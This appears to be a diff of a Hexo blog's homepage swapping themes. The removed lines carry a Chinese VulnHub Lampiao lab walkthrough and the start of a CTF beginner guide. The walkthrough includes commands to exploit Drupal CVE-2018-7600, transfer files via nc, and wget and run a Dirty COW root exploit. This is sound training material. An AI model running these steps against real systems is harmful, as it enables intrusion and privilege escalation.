@@ -1,1651 +1,861 @@
 <!DOCTYPE html>
+<html lang="zh-Hans">
+    <!-- title -->
 
 
 
-  
 
-
-<html class="theme-next muse use-motion" lang="zh-Hans">
 <head>
-  <meta charset="UTF-8"/>
-<meta http-equiv="X-UA-Compatible" content="IE=edge" />
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
-<meta name="theme-color" content="#222">
-
-
-
-
-
-
-
-
-
-<meta http-equiv="Cache-Control" content="no-transform" />
-<meta http-equiv="Cache-Control" content="no-siteapp" />
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-  
-  
-  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
-
-
-
-
-
-
-
-<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
-
-<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
-
-
-  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
-
-
-  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
-
-
-  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
-
-
-  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
-
-
-
-
-
-  <meta name="keywords" content="Hexo, NexT" />
-
-
-
-
-
-
-
-
-
-
-<meta property="og:type" content="website">
-<meta property="og:title" content="bak6ry">
-<meta property="og:url" content="http://yoursite.com/index.html">
-<meta property="og:site_name" content="bak6ry">
-<meta property="og:locale" content="zh-Hans">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="bak6ry">
-
-
-
-<script type="text/javascript" id="hexo.configurations">
-  var NexT = window.NexT || {};
-  var CONFIG = {
-    root: '/',
-    scheme: 'Muse',
-    version: '5.1.4',
-    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
-    fancybox: true,
-    tabs: true,
-    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
-    duoshuo: {
-      userId: '0',
-      author: '博主'
-    },
-    algolia: {
-      applicationID: '',
-      apiKey: '',
-      indexName: '',
-      hits: {"per_page":10},
-      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" >
+    <meta name="author" content="bak6ry">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="bak6ry">
+    <meta name="keywords" content="bak6ry | bak6ry">
+    <meta name="description" content="">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
+    <title>Bak6ry&#39;s Blog</title>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
     }
-  };
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href= "/css/style.css?v=20180824" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    <link rel="stylesheet" href= "/css/mobile.css?v=20180824" media="(max-width: 980px)">
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
 </script>
 
-
-
-  <link rel="canonical" href="http://yoursite.com/"/>
-
-
-
-
-
-
-  <script>
-  (function(i,s,o,g,r,a,m){i["DaoVoiceObject"]=r;i[r]=i[r]||function(){(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;a.charset="utf-8";m.parentNode.insertBefore(a,m)})(window,document,"script",('https:' == document.location.protocol ? 'https:' : 'http:') + "//widget.daovoice.io/widget/0f81ff2f.js","daovoice")
-  daovoice('init', {
-      app_id: "61988f7d"
-    });
-  daovoice('update');
-  </script>
-
-
-  <title>bak6ry</title>
-  
-
-
-
-
-
-
-
-
+    <link rel="icon" href= "/assets/favicon.ico" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script" />
+    <link rel="preload" href="/scripts/main.js" as="script" />
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
+    
+    <!-- fancybox -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
 </head>
 
-<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
-
-  
-  
     
-  
-
-  <div class="container sidebar-position-left 
-  page-home">
-    <div class="headband"></div>
-	<a href="https://github.com/zxc34081615"  class="github-corner" aria-label="View source on Github"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#151513; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
-
-    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
-      <div class="header-inner"><div class="site-brand-wrapper">
-  <div class="site-meta ">
+        <body class="home-body">
     
+    
+<header class="header index-header">
 
-    <div class="custom-logo-site-title">
-      <a href="/"  class="brand" rel="start">
-        <span class="logo-line-before"><i></i></span>
-        <span class="site-title">bak6ry</span>
-        <span class="logo-line-after"><i></i></span>
-      </a>
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <a class="home-link" href=/>Bak6ry's Blog</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style="
+
+
+
+
+
+
+
+height:50vh;
+">
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 文章页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/index-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            Bak6ry's Blog
+            <!-- 文章页  -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+                Never say never
+            
+            <!-- 文章页  -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
     </div>
-      
-        <p class="site-subtitle">welcome to taste bread</p>
-      
-  </div>
-
-  <div class="site-nav-toggle">
-    <button>
-      <span class="btn-bar"></span>
-      <span class="btn-bar"></span>
-      <span class="btn-bar"></span>
-    </button>
-  </div>
 </div>
-
-<nav class="site-nav">
-  
-
-  
-    <ul id="menu" class="menu">
-      
-        
-        <li class="menu-item menu-item-home">
-          <a href="/" rel="section">
-            
-              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
-            
-            首页
-          </a>
-        </li>
-      
-        
-        <li class="menu-item menu-item-tags">
-          <a href="/tags/" rel="section">
-            
-              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
-            
-            标签
-          </a>
-        </li>
-      
-        
-        <li class="menu-item menu-item-categories">
-          <a href="/categories/" rel="section">
-            
-              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
-            
-            分类
-          </a>
-        </li>
-      
-        
-        <li class="menu-item menu-item-archives">
-          <a href="/archives/" rel="section">
-            
-              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
-            
-            归档
-          </a>
-        </li>
-      
-
-      
-    </ul>
-  
-
-  
-</nav>
-
-
-
- </div>
-    </header>
-
-    <main id="main" class="main">
-      <div class="main-inner">
-        <div class="content-wrap">
-          <div id="content" class="content">
-            
-  <section id="posts" class="posts-expand">
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/09/01/lampiao/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="bak6ry">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="bak6ry">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/09/01/lampiao/" itemprop="url">vulnhub|渗透测试lampiao</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-09-01T01:46:13+08:00">
-                2018-09-01
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/比赛/" itemprop="url" rel="index">
-                    <span itemprop="name">比赛</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>该文已先在先知社区发表：原文地址：<a href="https://xz.aliyun.com/t/2552" target="_blank" rel="noopener">https://xz.aliyun.com/t/2552</a></p>
-<p>#vulnhub|渗透测试lampiao</p>
-<p>##题记</p>
-<p>最近在打靶机，发现了一个挺有意思的靶机，这里想跟大家分享一下.</p>
-<p>##环境准备<br>vulnhub最近出的一台靶机</p>
-<p><a href="https://www.vulnhub.com/entry/lampiao-1,249/" target="_blank" rel="noopener">靶机</a><br>Lampiao.zip (Size: 669 MB)</p>
-<p>Download: <a href="https://mega.nz/#!aG4AAaDB!CBLRRYQsAhTOyPJqyjC0Blr-weMH9QMdYbPfMj0LGeM" target="_blank" rel="noopener">https://mega.nz/#!aG4AAaDB!CBLRRYQsAhTOyPJqyjC0Blr-weMH9QMdYbPfMj0LGeM</a></p>
-<p>Download (Mirror): <a href="https://download.vulnhub.com/lampiao/Lampiao.zip" target="_blank" rel="noopener">https://download.vulnhub.com/lampiao/Lampiao.zip</a></p>
-<p>Download (Torrent): <a href="https://download.vulnhub.com/lampiao/Lampiao.zip.torrent" target="_blank" rel="noopener">https://download.vulnhub.com/lampiao/Lampiao.zip.torrent     ( Magnet)</a></p>
-<p>攻击机 Kali IP 10.10.10.128</p>
-<p>靶机在同一C段下 IP 10.10.10.129</p>
-<p>##主机发现</p>
-<p>使用命令<code>nmap -sP 192.168.107.1/24</code></p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180811110334-22a369f4-9d13-1.png" alt=""></p>
-<p>起始Ip 10.10.10.1，攻击机的ip是10.10.10.128，而10.10.10.254是结束ip。因为环境配置为dhcp动态分布，所以说我们的靶机ip就是10.10.10.129</p>
-<p>##端口扫描<br>我们需要知道目标机器上开了哪些端口，运行了哪些服务，利用某些服务的漏洞来进行攻击，所以我们先进行端口扫描。</p>
-<p>之前用nmap -sS 只扫出来个22端口，于是尝试ssh弱口令爆破，未果，</p>
-<p>利用题目信息生成字典，未果，访问网站，发现如下是个静态页面什么也没有。文件头，源代码中无有效信息。</p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180811110334-22c3c29e-9d13-1.png" alt=""></p>
-<p>后来反应过来，有可能网站还有其它端口可以访问，因为-sS参数是扫描常用的1000以内的端口号。于是用-p-参数：<code>nmap -p-  10.10.10.129</code></p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180811110334-22d8658c-9d13-1.png" alt=""></p>
-<p>扫出1898端口，于是访问，发现是个web服务端口：</p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180811110335-230cc444-9d13-1.png" alt=""></p>
-<p>大致对网站浏览下，查找下功能点。主要是进行信息收集</p>
-<p>##目录扫描<br>信息收集中非常重要的一步。这里我使用御剑扫描，可以看到，扫出来了robots.txt</p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180811110335-2328cfcc-9d13-1.png" alt=""></p>
-<p>于是访问robots.txt</p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180811110335-235b9e70-9d13-1.png" alt=""></p>
-<p>发现敏感文件/CHANGELOG.txt，一个记录更新的日志，访问发现是Drupal为框架的网站，最近一次更新为7.54</p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180811110336-2384e49c-9d13-1.png" alt=""></p>
-<p>##获取会话</p>
-<p>其它目录暂无发现有用信息，搜集到大致的敏感信息后于是搜索其对应的漏洞利用，推荐使用msf，非常全面，而且方便，使用前记得<code>msfdb start</code>启动其连接的数据库，这样查找速度会很快</p>
-<p>ps(kali默认是2.0版本也就是16年的，建议搜索前保证kali是最新版,漏洞才更全。现在用的是rolling更新源了。其他的源的话更新会报错。<a href="https://blog.csdn.net/xuqi7/article/details/71430349" target="_blank" rel="noopener">kali rolling 修改更新源</a></p>
-<p>msf启动后，search drupal搜索其存在的对应漏洞，发现如下。</p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180811110336-23a873b2-9d13-1.png" alt=""></p>
-<p>使用2018年这个漏洞。Drupal 在3月28日爆出的一个远程代码执行漏洞，CVE编号CVE-2018-7600。分析及 PoC 构造：<br><a href="https://paper.seebug.org/567/" target="_blank" rel="noopener">推荐连接</a></p>
-<p>我们直接利用，设置好目标主机10.10.10.129，目标端口号1898，查看以及设置目标操作系统类型，然后run执行，可以看到获取到了一个会话</p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180811110336-23fee4d6-9d13-1.png" alt=""></p>
-<p>执行shell获取交互式命令，由于我们获取的shell并不是一个具有完整交互的shell，对于已经安装了python的系统，我们可以使用python提供的pty模块，只需要一行脚本就可以创建一个原生的终端，命令如下：<code>python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</code></p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180811110337-241706d8-9d13-1.png" alt=""></p>
-<p>##寻找突破口</p>
-<p>果不其然是www-data用户，说明需要提权，ls -al查看网站根目录有些什么东西发现有几个东西不是网站根目录应该有的，所以应该可以获得什么重要信息，所以把这些文件传输到攻击机上一一查看</p>
-<ol>
-<li>先在攻击机上使用命令<code>nc =-lvp 1234&gt;接受的文件名</code>准备接收文件</li>
-<li>在靶机使用<code>nc -w 3 10.10.10.12&lt;要传输的文件名</code>传输文件</li>
-</ol>
-<p>在攻击机中打开，audio.m4a，lampiao.jpg，LuizGonzaga-LampiaoFalou.mp3，qrc.png如下发现</p>
-<ol>
-<li><p>qrc.png：一个二维码，扫出来的结果是 Try harger! muahuahuahua，被作者鼓励了。。</p>
-</li>
-<li><p>audio.m4a：提示为user tiago，说明要先找到用户tiago的密码</p>
-</li>
-<li><p>uizGonzaga-LampiaoFalou.mp3：一首音乐，丢入隐写工具没发现什么异常</p>
-</li>
-<li><p>lampiao.jpg：一张牛仔的图片，丢入binwlak中未发现有什么隐写</p>
-</li>
-</ol>
-<p>继续翻目录，找文件，在var/www/html/sites/default目录下找到配置文件settings.php，发现敏感信息，tiago以及密码，很有可能就是其系统用户tiago的密码</p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180811110337-242a62fa-9d13-1.png" alt=""></p>
-<p>##获取普通用户权限</p>
-<p>尝试登陆tiago用户，发现成功了。获取tiago用户的权限，根据提示及题目背景，发现tiago和lampiao很有些关系，那首音乐又提示说tiago。<br>然后试了试mysql数据库root的密码，结果密码也是tiago的登陆密码，成功获取Mysql数据库的root权限。我想tiago的提示也许就是这个意思吧</p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180811110337-24421576-9d13-1.png" alt=""></p>
-<p>在Mysql数据库中发现有drupal数据库，网站所有用户的信息就在这里了。这应该就是tiago这个用户最大的用处了吧，</p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180811110337-245908e4-9d13-1.png" alt=""></p>
-<p>##尝试爆破root密码</p>
-<p>获得普通用户的权限后，接下来的一步就是提权到最高的root权限了。通过前面收集的所有信息生成社工字典，ssh爆破，未成功，</p>
-<p>使用cewl<br>一个通过爬取网站上关键信息生成字典的一个神器，命令<code>cewl 1.1.1.1 -m 3 -d 3 -e -c -v -w a.txt</code>，爆破ssh未果</p>
-<p>##内核提权：</p>
-<p><code>uname -a</code>查看当前内核版本：</p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180811110337-246baf9e-9d13-1.png" alt=""></p>
-<p>这里需要去网上搜适合的exp了。推荐使用kali自带的searchsploit<br>,非常全面，方便，当然也可以去网上搜，</p>
-<p>这里我们利用的是CVE-2016-5195：脏牛(Dirty Cow)漏洞-Linux一个内核本地提权漏洞 ，黑客通过远程入侵获取低权限用户后，利用该漏洞在全版本Linux系统服务器上实现本地提权，从而获取到服务器root权限。</p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180811110337-248dccd2-9d13-1.png" alt=""></p>
-<p>漏洞影响范围：Linux Kernel &gt;= 2.6.22 的所有 Linux 系统</p>
-<p>意味着从 2007 年发布 2.6.22 版本开始，直到2016年10月18日为止，这中间发行的所有 Linux 系统都受影响。而我们的靶机为ubuntu14.04.5更新时间为16年-8月-05所以存在漏洞</p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180811110337-249d2eb6-9d13-1.png" alt=""></p>
-<p><a href="https://help.aliyun.com/knowledge_detail/44786.html" target="_blank" rel="noopener">漏洞通过及修复</a></p>
-<p>使用wget命令，下载提权exp到靶机：<code>wget https://www.exploit-db.com/download/40847.cpp</code></p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180811110338-24ba10c6-9d13-1.png" alt=""></p>
-<p>c++格式的文件，先编译，编译命令<code>g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil</code></p>
-<ol>
-<li><p>-Wall 一般使用该选项，允许发出GCC能够提供的所有有用的警告</p>
-</li>
-<li><p>-pedantic 允许发出ANSI/ISO C标准所列出的所有警告</p>
-</li>
-<li>-O2编译器的优化选项的4个级别，-O0表示没有优化,-O1为缺省值，-O3优化级别最高</li>
-<li>-std=c++11就是用按C++2011标准来编译的</li>
-<li>-pthread 在Linux中要用到多线程时，需要链接pthread库</li>
-<li>-o dcow gcc生成的目标文件,名字为dcow</li>
-</ol>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180811110338-24c89f7e-9d13-1.png" alt=""></p>
-<p><code>./dcow -s</code> 执行。提权成功</p>
-<p>目标机上如果没有编译环境，这时候，我们可以本地搭建和目标机一样的环境，在本地编译好提权exp后，在目标机器上运行即可</p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180811110338-24dd8da8-9d13-1.png" alt=""></p>
-<p>##Get flag</p>
-<p>flag肯定在root目录下。所以cd到root然后看到flag.txt ，cat查看一下。得到flag,通关。</p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180811110338-24fa6afe-9d13-1.png" alt=""></p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/08/31/ctf入门总结/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="bak6ry">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="bak6ry">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/08/31/ctf入门总结/" itemprop="url">ctf入门总结</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-08-31T15:26:00+08:00">
-                2018-08-31
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/比赛/" itemprop="url" rel="index">
-                    <span itemprop="name">比赛</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>下面中实验室指的是网络安全实验室</p>
-<p>题目全部来自bugku，南邮和网络安全实验室，题较基础，实验吧要复杂些，</p>
-<p>文中所有知识点内容并不全，要学习<strong>原理</strong>及<strong>深入</strong>得自己去找资源学习，自学与搜集信息的能力是必不可少的</p>
-<p>入门推荐书籍(必看):《白帽子讲web安全 》《代码审计:企业级web代码安全架构》</p>
-<h2 id="什么是CTF？"><a href="#什么是CTF？" class="headerlink" title="什么是CTF？"></a>什么是CTF？</h2><p>CTF（Capture The Flag）中文一般译作夺旗赛，在网络安全领域中指的是网络安全技术人员之间进行技术竞技的一种比赛形式CTF比赛通常包含的题目类型包括MISC、PPC、CRYPTO、PWN、REVERSE、WEB、STEGA</p>
-<h2 id="1-养成看源代码的习惯-简单"><a href="#1-养成看源代码的习惯-简单" class="headerlink" title="1.养成看源代码的习惯(简单)"></a>1.养成看源代码的习惯(简单)</h2><h3 id="flag在源代码中-："><a href="#flag在源代码中-：" class="headerlink" title="flag在源代码中()："></a>flag在源代码中()：</h3><p><a href="http://lab1.xseclab.com/base1_4a4d993ed7bd7d467b27af52d2aaa800/index.php" target="_blank" rel="noopener">题目</a></p>
-<h3 id="firebug修改源码绕过本地验证"><a href="#firebug修改源码绕过本地验证" class="headerlink" title="firebug修改源码绕过本地验证"></a>firebug修改源码绕过本地验证</h3><p><a href="http://120.24.86.145:8002/yanzhengma/" target="_blank" rel="noopener">题目</a></p>
-<p><a href="https://blog.csdn.net/weixin_40980428/article/details/79658665" target="_blank" rel="noopener">答案</a></p>
-<h3 id="CTF中源代码中一般有提示或者有敏感信息，建议养成看源代码的习惯"><a href="#CTF中源代码中一般有提示或者有敏感信息，建议养成看源代码的习惯" class="headerlink" title="CTF中源代码中一般有提示或者有敏感信息，建议养成看源代码的习惯"></a>CTF中源代码中一般有提示或者有敏感信息，建议养成看源代码的习惯</h3><p>ctrl加F通用的搜索快捷键。</p>
-<h3 id="这个题真是全程看源代码，快捷方式：F12"><a href="#这个题真是全程看源代码，快捷方式：F12" class="headerlink" title="这个题真是全程看源代码，快捷方式：F12"></a>这个题真是全程看源代码，快捷方式：F12</h3><p><a href="http://chinalover.sinaapp.com/web3/" target="_blank" rel="noopener">题目</a></p>
-<p><a href="https://blog.csdn.net/include_heqile/article/details/80301934" target="_blank" rel="noopener">答案</a></p>
-<h2 id="http头"><a href="#http头" class="headerlink" title="http头():"></a>http头():</h2><p><a href="https://t0data.gitbooks.io/burpsuite/content/chapter2.html" target="_blank" rel="noopener">burpsuite,浏览器代理设置教程</a>抓了包后右键放到repeater里，点go可以进行发包测试，用完Burpsuite过后，要正常上网的话，要把代理关了。</p>
